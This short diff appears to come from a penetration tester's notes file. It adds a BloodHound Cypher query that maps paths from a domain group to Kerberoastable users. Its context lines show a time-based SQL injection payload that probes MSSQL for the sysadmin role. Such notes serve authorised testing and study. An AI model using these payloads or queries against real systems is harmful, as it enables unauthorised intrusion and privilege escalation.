@@ -12,6 +12,14 @@ done
 
 IF (SELECT is_srvrolemember('sysadmin')) IS NOT NULL waitfor delay '0:0:10'--
 
+
+MATCH p = shortestPath(
+  (g:Group {name:"DOMAIN\\GroupName"})-[:MemberOf|AdminTo*1..]->(u:User)
+)
+WHERE u.hasspn = true
+RETURN p
+
+
 MATCH (u:User)-[:MemberOf]->(g:Group)
 RETURN g.name AS GroupName, collect(u.name) AS Users
 ORDER BY g.name
